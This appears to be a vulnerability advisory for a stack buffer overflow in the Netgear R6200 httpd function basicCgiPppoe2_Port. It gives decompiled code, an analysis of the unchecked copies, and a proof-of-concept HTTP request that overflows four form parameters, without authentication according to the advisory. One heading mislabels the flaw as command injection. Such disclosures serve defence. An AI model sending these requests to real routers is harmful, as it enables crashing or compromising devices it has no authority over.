# Buffer Overflow Vulnerability in `basicCgiPppoe2_Port`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Netgear R6200 Router                                         |
| Firmware Version     | V1.0.1.58_1.0.44                                             |
| Vulnerability Type   | **Buffer Overflow**                                          |
| Vulnerable Component | `httpd` (`basicCgiPppoe2_Port`) (multiple vulnerable buffers: `v7`, `v8`, `v9`, `v10`, `v11`) |
| Prerequisites        | No authentication required; attacker must supply crafted input via web interface parameters `Port_1`, `Port_2`, `Protocol`, `policyIndex` |

2. Exploitation Path

```c
int __fastcall basicCgiPppoe2_Port(char *a1, int a2)
{
  char *v4; // $v0
  int v5; // $v0
  char v7[8]; // [sp+18h] [-120h] BYREF
  char v8[8]; // [sp+20h] [-118h] BYREF
  char v9[8]; // [sp+28h] [-110h] BYREF
  char v10[8]; // [sp+30h] [-108h] BYREF
  char v11[256]; // [sp+38h] [-100h] BYREF

  memset(v11, 0, sizeof(v11));
  v7[0] = 0;
  v8[0] = 0;
  v9[0] = 0;
  v7[1] = 0;
  v7[2] = 0;
  v7[3] = 0;
  v7[4] = 0;
  v7[5] = 0;
  v7[6] = 0;
  v7[7] = 0;
  v8[1] = 0;
  v8[2] = 0;
  v8[3] = 0;
  v8[4] = 0;
  v8[5] = 0;
  v8[6] = 0;
  v8[7] = 0;
  v9[1] = 0;
  v9[2] = 0;
  v9[3] = 0;
  v9[4] = 0;
  v9[5] = 0;
  v9[6] = 0;
  v9[7] = 0;
  websGetVar(a1, "Port_1", v7);
  strcpy(v11, v7);
  v4 = &v11[strlen(v11)];
  v4[1] = 0;
  *v4 = 45;
  websGetVar(a1, "Port_2", v8);
  strcat(v11, v8);
  websGetVar(a1, "Protocol", v9);
  strcat(v11, ",");
  strcat(v11, v9);
  websGetVar(a1, "policyIndex", v10);
  if ( v10[0] )
  {
    v5 = atoi(v10);
    sub_42AB90(v11, v5);
  }
  else
  {
    sub_42AB90(v11, 0);
  }
  sendPage2Client("BAS_basic.htm", a2);
  return 0;
}
```

3. **Vulnerable Binaries:** The vulnerability resides in the `httpd` binary.

4. 0-Day Command Injection Exploitation Path: Multiple buffer overflow vulnerabilities are present in the `basicCgiPppoe2_Port` function:
   - At line 36, `websGetVar(a1, "Port_1", v7)` receives input into the destination buffer `v7`, which has a size of 8 bytes. Although `websGetVar` enforces a 255-byte length limit, no additional validation is applied, resulting in a buffer overflow.
   - At line 41, `websGetVar(a1, "Port_2", v8)` receives input into the destination buffer `v8` (8 bytes), with the same lack of bounds checking, leading to a buffer overflow.
   - At line 43, `websGetVar(a1, "Protocol", v9)` receives input into the destination buffer `v9` (8 bytes). Despite the 255-byte limit enforced by `websGetVar`, no further validation exists, causing a buffer overflow.
   - At line 46, `websGetVar(a1, "policyIndex", v10)` receives input into the destination buffer `v10` (8 bytes), also resulting in a buffer overflow due to insufficient validation.
   - At line 45, `strcat(v11, v9)` operates on the destination buffer `v11` (256 bytes). Following the concatenations at line 42 `strcat(v11, v8)` and line 44 `strcat(v11, ",")`, this sequence may trigger a buffer overflow because the total length may exceed the allocated size.

5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/basicCgiPppoe2_Port HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 1024
Connection: close

Port_1=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&Port_2=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
&Protocol=CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
&policyIndex=DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
```